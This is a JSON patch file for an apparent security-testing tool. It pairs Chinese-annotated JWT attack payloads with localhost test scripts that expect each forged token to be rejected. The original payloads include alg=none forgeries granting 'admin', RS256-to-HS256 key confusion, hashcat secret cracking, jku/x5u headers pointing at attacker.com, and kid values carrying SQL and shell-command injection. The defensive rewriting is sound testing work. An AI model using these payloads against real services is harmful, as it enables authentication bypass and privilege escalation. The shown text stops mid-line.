@@ -1,0 +1,268 @@
+{
+  "schemaVersion": 1,
+  "entries": [
+    {
+      "id": "jwt-security",
+      "patches": [
+        {
+          "area": "execution",
+          "index": 0,
+          "expectedCommand": "JWT格式: header.payload.signature\n解码:\necho \"HEADER\" | base64 -d\necho \"PAYLOAD\" | base64 -d\n或使用jwt.io",
+          "command": "python3 - <<'PY'\nimport base64, json\ntoken = \"eyJhbGciOiJIUzI1NiIsInR5cCI6InBheWxvYWRlcitqd3QifQ.eyJzdWIiOiJwYXlsb2FkZXItdXNlciIsImlzcyI6InBheWxvYWRlci10ZXN0IiwiYXVkIjoicGF5bG9hZGVyLWFwaSJ9.PAYLOADER_TEST_SIGNATURE\"\nfor label, segment in zip((\"header\", \"payload\"), token.split(\".\")[:2]):\n    decoded = base64.urlsafe_b64decode(segment + \"=\" * (-len(segment) % 4))\n    print(label, json.loads(decoded))\nPY\n# Structure inspection does not verify the signature, issuer, audience, time, or token type."
+        },
+        {
+          "area": "execution",
+          "index": 1,
+          "expectedCommand": "修改header为:\n{\"alg\":\"none\",\"typ\":\"JWT\"}\nBase64编码后构造:\nHEADER.PAYLOAD.\n(签名部分为空)",
+          "command": "python3 - <<'PY'\nimport base64, json, time\nencode = lambda value: base64.urlsafe_b64encode(json.dumps(value, separators=(\",\", \":\")).encode()).rstrip(b\"=\").decode()\nheader = {\"alg\": \"none\", \"typ\": \"payloader+jwt\"}\nclaims = {\"sub\": \"payloader-negative\", \"iss\": \"payloader-test\", \"aud\": \"payloader-api\", \"iat\": int(time.time()), \"exp\": int(time.time()) + 60}\nprint(encode(header) + \".\" + encode(claims) + \".\")\nPY\n# Expected: generation succeeds locally; every configured verifier rejects the unsigned token."
+        },
+        {
+          "area": "execution",
+          "index": 2,
+          "expectedCommand": "使用hashcat破解:\nhashcat -m 16500 jwt.txt wordlist.txt\n使用jwt_tool:\npython3 jwt_tool.py JWT_TOKEN -C -d wordlist.txt",
+          "command": "python3 - <<'PY'\nimport base64, hashlib, hmac\nmessage = b\"PAYLOADER_TEST_HEADER.PAYLOADER_TEST_PAYLOAD\"\napproved_secret = b\"PAYLOADER_TEST_HS256_SECRET_32_BYTES\"\nsignature = hmac.new(approved_secret, message, hashlib.sha256).digest()\ncandidates = [b\"PAYLOADER_WRONG_A\", b\"PAYLOADER_WRONG_B\", approved_secret]\nmatches = [candidate.decode() for candidate in candidates if hmac.compare_digest(hmac.new(candidate, message, hashlib.sha256).digest(), signature)]\nprint({\"candidate_count\": len(candidates), \"matches\": matches})\nPY\n# Fixed three-candidate owned-token audit; no masks, general wordlists, or production material."
+        },
+        {
+          "area": "execution",
+          "index": 3,
+          "expectedCommand": "将RS256算法改为HS256:\n{\"alg\":\"HS256\",\"typ\":\"JWT\"}\n使用公钥作为HMAC密钥签名",
+          "command": "work_dir=\"$(mktemp -d)\"\ntrap 'rm -rf \"$work_dir\"' EXIT\nopenssl genpkey -algorithm RSA -pkeyopt rsa_keygen_bits:2048 -out \"$work_dir/test-private.pem\"\nopenssl pkey -in \"$work_dir/test-private.pem\" -pubout -out \"$work_dir/test-public.pem\"\npython3 - \"$work_dir/test-public.pem\" <<'PY'\nimport base64, hashlib, hmac, json, sys, time\nencode = lambda value: base64.urlsafe_b64encode(json.dumps(value, separators=(\",\", \":\")).encode()).rstrip(b\"=\").decode()\npublic_key = open(sys.argv[1], \"rb\").read()\nheader = encode({\"alg\": \"HS256\", \"typ\": \"payloader+jwt\", \"kid\": \"PAYLOADER_RSA_TEST_KEY\"})\nclaims = encode({\"sub\": \"payloader-negative\", \"iss\": \"payloader-test\", \"aud\": \"payloader-api\", \"iat\": int(time.time()), \"exp\": int(time.time()) + 60})\nsignature = base64.urlsafe_b64encode(hmac.new(public_key, (header + \".\" + claims).encode(), hashlib.sha256).digest()).rstrip(b\"=\").decode()\nprint(header + \".\" + claims + \".\" + signature)\nPY\n# This historical confusion token is generated only from a temporary local public key; a modern verifier rejects it."
+        },
+        {
+          "area": "execution",
+          "index": 4,
+          "expectedCommand": "修改payload中的用户信息:\n{\"sub\":\"admin\",\"iat\":1234567890}\n重新编码并使用已知密钥签名",
+          "command": "python3 - <<'PY'\nimport base64, hashlib, hmac, json, time, urllib.error, urllib.request\nencode = lambda value: base64.urlsafe_b64encode(json.dumps(value, separators=(\",\", \":\")).encode()).rstrip(b\"=\").decode()\nsecret = b\"PAYLOADER_TEST_HS256_SECRET_32_BYTES\"\nnow = int(time.time())\ncases = {\n    \"valid\": {\"sub\":\"payloader-user\",\"iss\":\"payloader-test\",\"aud\":\"payloader-api\",\"iat\":now,\"exp\":now+60},\n    \"wrong-issuer\": {\"sub\":\"payloader-user\",\"iss\":\"payloader-other\",\"aud\":\"payloader-api\",\"iat\":now,\"exp\":now+60},\n    \"wrong-audience\": {\"sub\":\"payloader-user\",\"iss\":\"payloader-test\",\"aud\":\"payloader-other\",\"iat\":now,\"exp\":now+60},\n    \"expired\": {\"sub\":\"payloader-user\",\"iss\":\"payloader-test\",\"aud\":\"payloader-api\",\"iat\":now-120,\"exp\":now-60},\n}\nfor name, claims in cases.items():\n    header = encode({\"alg\":\"HS256\",\"typ\":\"payloader+jwt\",\"kid\":\"PAYLOADER_TEST_KEY\"})\n    payload = encode(claims)\n    signature = base64.urlsafe_b64encode(hmac.new(secret, (header+\".\"+payload).encode(), hashlib.sha256).digest()).rstrip(b\"=\").decode()\n    request = urllib.request.Request(\"http://127.0.0.1:8080/api/marker\", headers={\"Authorization\":\"Bearer \"+header+\".\"+payload+\".\"+signature})\n    try:\n        status = urllib.request.urlopen(request, timeout=5).status\n    except urllib.error.HTTPError as error:\n        status = error.code\n    print(name, status)\nPY\n# Only the valid profile reaches the read-only marker; issuer, audience, and expiration failures are independent."
+        },
+        {
+          "area": "wafBypass",
+          "index": 0,
+          "expectedCommand": "# JWK内嵌公钥注入:\n# 在JWT Header中嵌入攻击者的公钥:\n{\"alg\":\"RS256\",\"typ\":\"JWT\",\"jwk\":{\"kty\":\"RSA\",\"n\":\"attacker_n\",\"e\":\"AQAB\"}}\n# 服务端使用Header中的JWK验证签名\n\n# JKU远程密钥集注入:\n{\"alg\":\"RS256\",\"typ\":\"JWT\",\"jku\":\"http://attacker.com/.well-known/jwks.json\"}\n# 服务端从攻击者控制的URL获取密钥",
+          "command": "python3 - <<'PY'\nimport base64, hashlib, hmac, json, time, urllib.error, urllib.request\nencode = lambda value: base64.urlsafe_b64encode(json.dumps(value, separators=(\",\", \":\")).encode()).rstrip(b\"=\").decode()\nheader = encode({\"alg\":\"HS256\",\"typ\":\"payloader+jwt\",\"jwk\":{\"kty\":\"oct\",\"kid\":\"PAYLOADER_UNTRUSTED\",\"k\":\"UEFZTE9BREVSX1VOVFJVU1RFRA\"}})\npayload = encode({\"sub\":\"payloader-negative\",\"iss\":\"payloader-test\",\"aud\":\"payloader-api\",\"iat\":int(time.time()),\"exp\":int(time.time())+60})\nsignature = base64.urlsafe_b64encode(hmac.new(b\"PAYLOADER_UNTRUSTED\", (header+\".\"+payload).encode(), hashlib.sha256).digest()).rstrip(b\"=\").decode()\nrequest = urllib.request.Request(\"http://127.0.0.1:8080/api/marker\", headers={\"Authorization\":\"Bearer \"+header+\".\"+payload+\".\"+signature})\ntry:\n    print(urllib.request.urlopen(request, timeout=5).status)\nexcept urllib.error.HTTPError as error:\n    print(error.code)\nPY\n# Expected: the token-supplied JWK is ignored and the token is rejected because no configured key matches."
+        },
+        {
+          "area": "wafBypass",
+          "index": 1,
+          "expectedCommand": "# 生成自签名证书:\nopenssl req -x509 -nodes -newkey rsa:2048 -keyout attacker.key -out attacker.crt -subj \"/CN=attacker\"\n\n# 构造JWT Header:\n{\"alg\":\"RS256\",\"x5c\":[\"ATTACKER_CERT_BASE64\"]}\n\n# 用攻击者私钥签名，x5c中放入攻击者证书\n# 服务端从x5c提取公钥验证签名，攻击者自签即可通过\n\n# 使用jwt_tool:\npython3 jwt_tool.py <token> -X s -pr attacker.key",
+          "command": "work_dir=\"$(mktemp -d)\"\ntrap 'rm -rf \"$work_dir\"' EXIT\nopenssl req -x509 -nodes -newkey rsa:2048 -keyout \"$work_dir/key.pem\" -out \"$work_dir/cert.pem\" -days 1 -subj \"/CN=payloader-untrusted\"\npython3 - \"$work_dir/key.pem\" \"$work_dir/cert.pem\" <<'PY'\nimport base64, json, subprocess, sys, time, urllib.error, urllib.request\nencode = lambda raw: base64.urlsafe_b64encode(raw).rstrip(b\"=\").decode()\ncertificate = subprocess.check_output([\"openssl\",\"x509\",\"-in\",sys.argv[2],\"-outform\",\"DER\"])\nheader = encode(json.dumps({\"alg\":\"RS256\",\"typ\":\"payloader+jwt\",\"x5c\":[base64.b64encode(certificate).decode()]}, separators=(\",\",\":\")).encode())\npayload = encode(json.dumps({\"sub\":\"payloader-negative\",\"iss\":\"payloader-test\",\"aud\":\"payloader-api\",\"iat\":int(time.time()),\"exp\":int(time.time())+60}, separators=(\",\",\":\")).encode())\nsigning_input = (header+\".\"+payload).encode()\nsignature = subprocess.check_output([\"openssl\",\"dgst\",\"-sha256\",\"-sign\",sys.argv[1]], input=signing_input)\ntoken = header+\".\"+payload+\".\"+encode(signature)\nrequest = urllib.request.Request(\"http://127.0.0.1:8080/api/marker\", headers={\"Authorization\":\"Bearer \"+token})\ntry:\n    print(urllib.request.urlopen(request, timeout=5).status)\nexcept urllib.error.HTTPError as error:\n    print(error.code)\nPY\n# Expected: a correctly signed token with an untrusted self-signed x5c chain is rejected."
+        }
+      ]
+    },
+    {
+      "id": "jwt-none-alg",
+      "patches": [
+        {
+          "area": "execution",
+          "index": 0,
+          "expectedCommand": "# 在线解码\nhttps://jwt.io\n\n# 使用命令行\necho \"HEADER\" | base64 -d\necho \"PAYLOAD\" | base64 -d\n\n# 使用Python\nimport jwt\ndecoded = jwt.decode(token, options={\"verify_signature\": False})\nprint(decoded)",
+          "command": "python3 - <<'PY'\nimport base64, json\ntoken = \"eyJhbGciOiJIUzI1NiIsInR5cCI6InBheWxvYWRlcitqd3QifQ.eyJzdWIiOiJwYXlsb2FkZXItdXNlciIsImlzcyI6InBheWxvYWRlci10ZXN0IiwiYXVkIjoicGF5bG9hZGVyLWFwaSJ9.PAYLOADER_TEST_SIGNATURE\"\nfor label, segment in zip((\"header\", \"payload\"), token.split(\".\")[:2]):\n    decoded = base64.urlsafe_b64decode(segment + \"=\" * (-len(segment) % 4))\n    print(label, json.loads(decoded))\nPY\n# Structure inspection does not verify the signature, issuer, audience, time, or token type."
+        },
+        {
+          "area": "execution",
+          "index": 1,
+          "expectedCommand": "# 修改头部为none算法\n# 原始头部\n{\"alg\":\"HS256\",\"typ\":\"JWT\"}\n\n# 修改为\n{\"alg\":\"none\",\"typ\":\"JWT\"}\n{\"alg\":\"None\",\"typ\":\"JWT\"}\n{\"alg\":\"NONE\",\"typ\":\"JWT\"}\n{\"alg\":\"nOnE\",\"typ\":\"JWT\"}\n\n# 使用Python构造\nimport base64, json\nheader = {\"alg\":\"none\",\"typ\":\"JWT\"}\npayload = {\"sub\":\"admin\",\"iat\":1516239022}\ntoken = base64.urlsafe_b64encode(json.dumps(header).encode()).decode().rstrip(\"=\") + \".\" + \\\n        base64.urlsafe_b64encode(json.dumps(payload).encode()).decode().rstrip(\"=\") + \".\"\nprint(token)",
+          "command": "python3 - <<'PY'\nimport base64, json, time\nencode = lambda value: base64.urlsafe_b64encode(json.dumps(value, separators=(\",\", \":\")).encode()).rstrip(b\"=\").decode()\nheader = {\"alg\": \"none\", \"typ\": \"payloader+jwt\"}\nclaims = {\"sub\": \"payloader-negative\", \"iss\": \"payloader-test\", \"aud\": \"payloader-api\", \"iat\": int(time.time()), \"exp\": int(time.time()) + 60}\nprint(encode(header) + \".\" + encode(claims) + \".\")\nPY\n# Expected: generation succeeds locally; every configured verifier rejects the unsigned token."
+        },
+        {
+          "area": "execution",
+          "index": 2,
+          "expectedCommand": "# 修改payload提权\n# 原始payload\n{\"sub\":\"user\",\"role\":\"user\",\"iat\":1516239022}\n\n# 修改为\n{\"sub\":\"admin\",\"role\":\"admin\",\"iat\":1516239022}\n\n# 完整攻击\nimport base64, json\nheader = base64.urlsafe_b64encode(b'{\"alg\":\"none\",\"typ\":\"JWT\"}').decode().rstrip(\"=\")\npayload = base64.urlsafe_b64encode(b'{\"sub\":\"admin\",\"role\":\"admin\"}').decode().rstrip(\"=\")\ntoken = header + \".\" + payload + \".\"\nprint(token)",
+          "command": "python3 - <<'PY'\nimport base64, json, time\nencode = lambda value: base64.urlsafe_b64encode(json.dumps(value, separators=(\",\", \":\")).encode()).rstrip(b\"=\").decode()\nfor subject in (\"payloader-user\", \"payloader-negative\"):\n    claims = {\"sub\":subject,\"iss\":\"payloader-test\",\"aud\":\"payloader-api\",\"iat\":int(time.time()),\"exp\":int(time.time())+60}\n    print(encode({\"alg\":\"none\",\"typ\":\"payloader+jwt\"})+\".\"+encode(claims)+\".\")\nPY\n# Claim changes do not matter because every unsigned token is rejected before authorization."
+        },
+        {
+          "area": "execution",
+          "index": 3,
+          "expectedCommand": "# 使用curl发送\ncurl -H \"Authorization: Bearer <MALICIOUS_TOKEN>\" http://target.com/api/admin\n\n# 空签名测试\ncurl -H \"Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9.\" http://target.com/api/admin",
+          "command": "python3 - <<'PY'\nimport base64, json, time, urllib.error, urllib.request\nencode = lambda value: base64.urlsafe_b64encode(json.dumps(value, separators=(\",\", \":\")).encode()).rstrip(b\"=\").decode()\ntoken = encode({\"alg\": \"none\", \"typ\": \"payloader+jwt\"}) + \".\" + encode({\"sub\": \"payloader-negative\", \"iss\": \"payloader-test\", \"aud\": \"payloader-api\", \"iat\": int(time.time()), \"exp\": int(time.time()) + 60}) + \".\"\nrequest = urllib.request.Request(\"http://127.0.0.1:8080/api/marker\", headers={\"Authorization\": \"Bearer \" + token})\ntry:\n    print(urllib.request.urlopen(request, timeout=5).status)\nexcept urllib.error.HTTPError as error:\n    print(error.code)\nPY\n# Expected: 401 or 403 and no authenticated principal."
+        },
+        {
+          "area": "wafBypass",
+          "index": 0,
+          "expectedCommand": "# 尝试不同变体\n{\"alg\":\"none\"}\n{\"alg\":\"None\"}\n{\"alg\":\"NONE\"}\n{\"alg\":\"nOnE\"}\n{\"alg\":\"\"}\n{\"alg\":null}\n\n# 移除alg字段\n{\"typ\":\"JWT\"}",
+          "command": "python3 - <<'PY'\nimport base64, json, time, urllib.error, urllib.request\nencode = lambda value: base64.urlsafe_b64encode(json.dumps(value, separators=(\",\", \":\")).encode()).rstrip(b\"=\").decode()\nclaims = encode({\"sub\": \"payloader-negative\", \"iss\": \"payloader-test\", \"aud\": \"payloader-api\", \"iat\": int(time.time()), \"exp\": int(time.time()) + 60})\nfor algorithm in (\"none\", \"None\", \"NONE\", \"\"):\n    token = encode({\"alg\": algorithm, \"typ\": \"payloader+jwt\"}) + \".\" + claims + \".\"\n    request = urllib.request.Request(\"http://127.0.0.1:8080/api/marker\", headers={\"Authorization\": \"Bearer \" + token})\n    try:\n        status = urllib.request.urlopen(request, timeout=5).status\n    except urllib.error.HTTPError as error:\n        status = error.code\n    print(repr(algorithm), status)\nPY\n# Fixed four-case budget; every unsigned or unapproved algorithm is rejected."
+        },
+        {
+          "area": "wafBypass",
+          "index": 1,
+          "expectedCommand": "# 空签名\nheader.payload.\n\n# 任意签名\nheader.payload.anysignature\n\n# 使用原始签名\n# 某些库会忽略签名验证",
+          "command": "python3 - <<'PY'\nimport urllib.error, urllib.request\ntokens = (\n    \"PAYLOADER_HEADER.PAYLOADER_PAYLOAD.\",\n    \"PAYLOADER_HEADER.PAYLOADER_PAYLOAD.PAYLOADER_ARBITRARY\",\n    \"PAYLOADER_HEADER.PAYLOADER_PAYLOAD\",\n)\nfor token in tokens:\n    request = urllib.request.Request(\"http://127.0.0.1:8080/api/marker\", headers={\"Authorization\": \"Bearer \" + token})\n    try:\n        status = urllib.request.urlopen(request, timeout=5).status\n    except urllib.error.HTTPError as error:\n        status = error.code\n    print(status)\nPY\n# Empty, arbitrary, and missing signature segments are all rejected before claim use."
+        }
+      ]
+    },
+    {
+      "id": "jwt-key-confusion",
+      "patches": [
+        {
+          "area": "execution",
+          "index": 0,
+          "expectedCommand": "# 从证书获取\ncurl -k https://target.com/.well-known/jwks.json\n\n# 从SSL证书获取\necho | openssl s_client -connect target.com:443 2>/dev/null | openssl x509 -pubkey -noout\n\n# 从JWT头部获取\n# 解码JWT头部，查找x5c或jku字段\n\n# 常见公钥位置\n/.well-known/jwks.json\n/api/keys\n/public.key\n/pubkey.pem",
+          "command": "fixture_dir=\".payloader-jwt-fixture\"\nmkdir -p \"$fixture_dir\"\nopenssl genpkey -algorithm RSA -pkeyopt rsa_keygen_bits:2048 -out \"$fixture_dir/private.pem\"\nopenssl pkey -in \"$fixture_dir/private.pem\" -pubout -out \"$fixture_dir/public.pem\"\nopenssl pkey -pubin -in \"$fixture_dir/public.pem\" -outform DER | openssl dgst -sha256\n# Disposable local fixture only; remove the directory after the batch."
+        },
+        {
+          "area": "execution",
+          "index": 1,
+          "expectedCommand": "# 将RS256改为HS256\n# 使用公钥作为HMAC密钥\n\nimport jwt\nimport base64\n\n# 获取公钥\npublic_key = open(\"public.pem\").read()\n\n# 构造payload\npayload = {\"sub\":\"admin\",\"role\":\"admin\"}\n\n# 使用公钥作为HMAC密钥签名\ntoken = jwt.encode(payload, public_key, algorithm=\"HS256\")\nprint(token)",
+          "command": "work_dir=\"$(mktemp -d)\"\ntrap 'rm -rf \"$work_dir\"' EXIT\nopenssl genpkey -algorithm RSA -pkeyopt rsa_keygen_bits:2048 -out \"$work_dir/test-private.pem\"\nopenssl pkey -in \"$work_dir/test-private.pem\" -pubout -out \"$work_dir/test-public.pem\"\npython3 - \"$work_dir/test-public.pem\" <<'PY'\nimport base64, hashlib, hmac, json, sys, time\nencode = lambda value: base64.urlsafe_b64encode(json.dumps(value, separators=(\",\", \":\")).encode()).rstrip(b\"=\").decode()\npublic_key = open(sys.argv[1], \"rb\").read()\nheader = encode({\"alg\": \"HS256\", \"typ\": \"payloader+jwt\", \"kid\": \"PAYLOADER_RSA_TEST_KEY\"})\nclaims = encode({\"sub\": \"payloader-negative\", \"iss\": \"payloader-test\", \"aud\": \"payloader-api\", \"iat\": int(time.time()), \"exp\": int(time.time()) + 60})\nsignature = base64.urlsafe_b64encode(hmac.new(public_key, (header + \".\" + claims).encode(), hashlib.sha256).digest()).rstrip(b\"=\").decode()\nprint(header + \".\" + claims + \".\" + signature)\nPY\n# This historical confusion token is generated only from a temporary local public key; a modern verifier rejects it."
+        },
+        {
+          "area": "execution",
+          "index": 2,
+          "expectedCommand": "# 使用构造的Token\ncurl -H \"Authorization: Bearer <HS256_TOKEN>\" http://target.com/api/admin\n\n# Python脚本\nimport requests\nheaders = {\"Authorization\": f\"Bearer {token}\"}\nresponse = requests.get(\"http://target.com/api/admin\", headers=headers)\nprint(response.text)",
+          "command": "curl -sS --max-time 5 -o /dev/null -w \"%{http_code}\\n\" -H \"Authorization: Bearer PAYLOADER_ALG_CONFUSION_TEST_TOKEN\" http://127.0.0.1:8080/api/marker\n# Expected: 401 or 403 because the verifier pins RS256 and refuses an RSA public key as an HMAC secret."
+        },
+        {
+          "area": "wafBypass",
+          "index": 0,
+          "expectedCommand": "# kid参数注入\n# 修改JWT头部kid字段\n{\"alg\":\"HS256\",\"typ\":\"JWT\",\"kid\":\"../../dev/null\"}\n\n# SQL注入kid\n{\"alg\":\"HS256\",\"typ\":\"JWT\",\"kid\":\"key UNION SELECT secret--\"}\n\n# 命令注入kid\n{\"alg\":\"HS256\",\"typ\":\"JWT\",\"kid\":\"|/bin/bash -c id\"}",
+          "command": "python3 - <<'PY'\nimport base64, hashlib, hmac, json, time, urllib.error, urllib.request\nencode = lambda value: base64.urlsafe_b64encode(json.dumps(value, separators=(\",\", \":\")).encode()).rstrip(b\"=\").decode()\nsecret = b\"PAYLOADER_TEST_HS256_SECRET_32_BYTES\"\nkids = (\"PAYLOADER_TEST_KEY\", \"PAYLOADER_UNKNOWN_KEY\", \"PAYLOADER_DISABLED_KEY\", \"PAYLOADER_KEY_\" + \"X\" * 80)\nfor kid in kids:\n    header = encode({\"alg\": \"HS256\", \"typ\": \"payloader+jwt\", \"kid\": kid})\n    claims = encode({\"sub\": \"payloader-user\", \"iss\": \"payloader-test\", \"aud\": \"payloader-api\", \"iat\": int(time.time()), \"exp\": int(time.time()) + 60})\n    signature = base64.urlsafe_b64encode(hmac.new(secret, (header + \".\" + claims).encode(), hashlib.sha256).digest()).rstrip(b\"=\").decode()\n    request = urllib.request.Request(\"http://127.0.0.1:8080/api/marker\", headers={\"Authorization\": \"Bearer \" + header + \".\" + claims + \".\" + signature})\n    try:\n        status = urllib.request.urlopen(request, timeout=5).status\n    except urllib.error.HTTPError as error:\n        status = error.code\n    print(kid[:32], status)\nPY\n# Only the configured opaque key ID may reach signature verification; unknown, disabled, and overlong identifiers are rejected."
+        },
+        {
+          "area": "wafBypass",
+          "index": 1,
+          "expectedCommand": "# jku指向攻击者服务器\n{\"alg\":\"RS256\",\"typ\":\"JWT\",\"jku\":\"https://attacker.com/.well-known/jwks.json\"}\n\n# x5u指向攻击者证书\n{\"alg\":\"RS256\",\"typ\":\"JWT\",\"x5u\":\"https://attacker.com/cert.pem\"}\n\n# 在攻击者服务器托管恶意密钥",
+          "command": "{\"alg\":\"RS256\",\"typ\":\"payloader+jwt\",\"jku\":\"http://127.0.0.1:18080/jwks.json\",\"kid\":\"PAYLOADER_UNTRUSTED\"}\n{\"alg\":\"RS256\",\"typ\":\"payloader+jwt\",\"x5u\":\"http://127.0.0.1:18080/test-cert.pem\",\"kid\":\"PAYLOADER_UNTRUSTED\"}\n{\"alg\":\"RS256\",\"typ\":\"payloader+jwt\",\"jku\":\"https://keys.example.invalid/jwks.json\",\"kid\":\"PAYLOADER_UNTRUSTED\"}\n# Expected: the verifier follows no token-supplied URL unless it exactly matches the configured local fixture allowlist."
+        }
+      ]
+    },
+    {
+      "id": "jwt-none-attack",
+      "patches": [
+        {
+          "area": "execution",
+          "index": 0,
+          "expectedCommand": "# 解码JWT的三个部分\necho \"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiZ3Vlc3QiLCJyb2xlIjoidXNlciJ9.signature\" | cut -d. -f1 | base64 -d\n# 输出: {\"alg\":\"HS256\",\"typ\":\"JWT\"}\n\necho \"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiZ3Vlc3QiLCJyb2xlIjoidXNlciJ9.signature\" | cut -d. -f2 | base64 -d\n# 输出: {\"user\":\"guest\",\"role\":\"user\"}",
+          "command": "python3 - <<'PY'\nimport base64, json\ntoken = \"eyJhbGciOiJIUzI1NiIsInR5cCI6InBheWxvYWRlcitqd3QifQ.eyJzdWIiOiJwYXlsb2FkZXItdXNlciIsImlzcyI6InBheWxvYWRlci10ZXN0IiwiYXVkIjoicGF5bG9hZGVyLWFwaSJ9.PAYLOADER_TEST_SIGNATURE\"\nfor label, segment in zip((\"header\", \"payload\"), token.split(\".\")[:2]):\n    decoded = base64.urlsafe_b64decode(segment + \"=\" * (-len(segment) % 4))\n    print(label, json.loads(decoded))\nPY\n# Structure inspection does not verify the signature, issuer, audience, time, or token type."
+        },
+        {
+          "area": "execution",
+          "index": 1,
+          "expectedCommand": "import base64, json\n\n# 修改Header为none算法\nheader = base64.urlsafe_b64encode(\n    json.dumps({\"alg\":\"none\",\"typ\":\"JWT\"}).encode()\n).rstrip(b\"=\").decode()\n\n# 修改Payload为admin\npayload = base64.urlsafe_b64encode(\n    json.dumps({\"user\":\"admin\",\"role\":\"admin\"}).encode()\n).rstrip(b\"=\").decode()\n\n# 签名为空\nforged_jwt = f\"{header}.{payload}.\"\nprint(forged_jwt)",
+          "command": "python3 - <<'PY'\nimport base64, json, time\nencode = lambda value: base64.urlsafe_b64encode(json.dumps(value, separators=(\",\", \":\")).encode()).rstrip(b\"=\").decode()\nheader = {\"alg\": \"none\", \"typ\": \"payloader+jwt\"}\nclaims = {\"sub\": \"payloader-negative\", \"iss\": \"payloader-test\", \"aud\": \"payloader-api\", \"iat\": int(time.time()), \"exp\": int(time.time()) + 60}\nprint(encode(header) + \".\" + encode(claims) + \".\")\nPY\n# Expected: generation succeeds locally; every configured verifier rejects the unsigned token."
+        },
+        {
+          "area": "execution",
+          "index": 2,
+          "expectedCommand": "python3 jwt_tool.py {TOKEN} -X a\n\n# -X a = 尝试none算法攻击\n# 同时测试多种none变体\n# none, None, NONE, nOnE, noNe",
+          "command": "python3 jwt_tool.py fixtures/payloader-unsigned.jwt -X a\n# Offline synthetic fixture only; the output is a negative-control token for the localhost verifier."
+        },
+        {
+          "area": "execution",
+          "index": 3,
+          "expectedCommand": "curl -s -H \"Authorization: Bearer {FORGED_JWT}\" \\\n  \"https://{TARGET}/api/admin/dashboard\"\n\n# 检查是否获得管理员权限\n# 200 OK = 攻击成功\n# 401/403 = 服务端正确拒绝none算法",
+          "command": "python3 - <<'PY'\nimport base64, json, time, urllib.error, urllib.request\nencode = lambda value: base64.urlsafe_b64encode(json.dumps(value, separators=(\",\", \":\")).encode()).rstrip(b\"=\").decode()\ntoken = encode({\"alg\": \"none\", \"typ\": \"payloader+jwt\"}) + \".\" + encode({\"sub\": \"payloader-negative\", \"iss\": \"payloader-test\", \"aud\": \"payloader-api\", \"iat\": int(time.time()), \"exp\": int(time.time()) + 60}) + \".\"\nrequest = urllib.request.Request(\"http://127.0.0.1:8080/api/marker\", headers={\"Authorization\": \"Bearer \" + token})\ntry:\n    print(urllib.request.urlopen(request, timeout=5).status)\nexcept urllib.error.HTTPError as error:\n    print(error.code)\nPY\n# Expected: 401 or 403 and no authenticated principal."
+        },
+        {
+          "area": "wafBypass",
+          "index": 0,
+          "expectedCommand": "# 各种none变体\n{\"alg\":\"none\"}\n{\"alg\":\"None\"}\n{\"alg\":\"NONE\"}\n{\"alg\":\"nOnE\"}\n{\"alg\":\"noNe\"}\n{\"alg\":\"nONE\"}\n\n# 添加签名占位\nheader.payload.\nheader.payload.AA==\nheader.payload.e30=",
+          "command": "python3 - <<'PY'\nimport base64, json, time, urllib.error, urllib.request\nencode = lambda value: base64.urlsafe_b64encode(json.dumps(value, separators=(\",\", \":\")).encode()).rstrip(b\"=\").decode()\nclaims = encode({\"sub\": \"payloader-negative\", \"iss\": \"payloader-test\", \"aud\": \"payloader-api\", \"iat\": int(time.time()), \"exp\": int(time.time()) + 60})\nfor algorithm in (\"none\", \"None\", \"NONE\", \"\"):\n    token = encode({\"alg\": algorithm, \"typ\": \"payloader+jwt\"}) + \".\" + claims + \".\"\n    request = urllib.request.Request(\"http://127.0.0.1:8080/api/marker\", headers={\"Authorization\": \"Bearer \" + token})\n    try:\n        status = urllib.request.urlopen(request, timeout=5).status\n    except urllib.error.HTTPError as error:\n        status = error.code\n    print(repr(algorithm), status)\nPY\n# Fixed four-case budget; every unsigned or unapproved algorithm is rejected."
+        }
+      ]
+    },
+    {
+      "id": "jwt-key-confusion-157",
+      "patches": [
+        {
+          "area": "execution",
+          "index": 0,
+          "expectedCommand": "# 常见公钥泄露位置\ncurl -s \"https://{TARGET}/.well-known/jwks.json\" | jq\ncurl -s \"https://{TARGET}/api/keys\" | jq\ncurl -s \"https://{TARGET}/oauth/discovery\" | jq\n\n# 从JWKS中提取公钥\n# 或从SSL证书中获取\nopenssl s_client -connect {TARGET}:443 | openssl x509 -pubkey -noout > pubkey.pem",
+          "command": "fixture_dir=\".payloader-jwt-fixture\"\nmkdir -p \"$fixture_dir\"\nopenssl genpkey -algorithm RSA -pkeyopt rsa_keygen_bits:2048 -out \"$fixture_dir/private.pem\"\nopenssl pkey -in \"$fixture_dir/private.pem\" -pubout -out \"$fixture_dir/public.pem\"\nopenssl pkey -pubin -in \"$fixture_dir/public.pem\" -outform DER | openssl dgst -sha256\n# Disposable local fixture only; remove the directory after the batch."
+        },
+        {
+          "area": "execution",
+          "index": 1,
+          "expectedCommand": "import jwt\nimport json\n\n# 读取RSA公钥\nwith open(\"pubkey.pem\", \"rb\") as f:\n    public_key = f.read()\n\n# 用公钥作为HMAC密钥签名\nforged_payload = {\n    \"user\": \"admin\",\n    \"role\": \"admin\",\n    \"iat\": 1707811200,\n    \"exp\": 1999999999\n}\n\n# 将算法从RS256切换为HS256\nforged_token = jwt.encode(\n    forged_payload,\n    public_key,        # RSA公钥作为HMAC密钥\n    algorithm=\"HS256\"  # 改为HMAC算法\n)\nprint(forged_token)",
+          "command": "work_dir=\"$(mktemp -d)\"\ntrap 'rm -rf \"$work_dir\"' EXIT\nopenssl genpkey -algorithm RSA -pkeyopt rsa_keygen_bits:2048 -out \"$work_dir/test-private.pem\"\nopenssl pkey -in \"$work_dir/test-private.pem\" -pubout -out \"$work_dir/test-public.pem\"\npython3 - \"$work_dir/test-public.pem\" <<'PY'\nimport base64, hashlib, hmac, json, sys, time\nencode = lambda value: base64.urlsafe_b64encode(json.dumps(value, separators=(\",\", \":\")).encode()).rstrip(b\"=\").decode()\npublic_key = open(sys.argv[1], \"rb\").read()\nheader = encode({\"alg\": \"HS256\", \"typ\": \"payloader+jwt\", \"kid\": \"PAYLOADER_RSA_TEST_KEY\"})\nclaims = encode({\"sub\": \"payloader-negative\", \"iss\": \"payloader-test\", \"aud\": \"payloader-api\", \"iat\": int(time.time()), \"exp\": int(time.time()) + 60})\nsignature = base64.urlsafe_b64encode(hmac.new(public_key, (header + \".\" + claims).encode(), 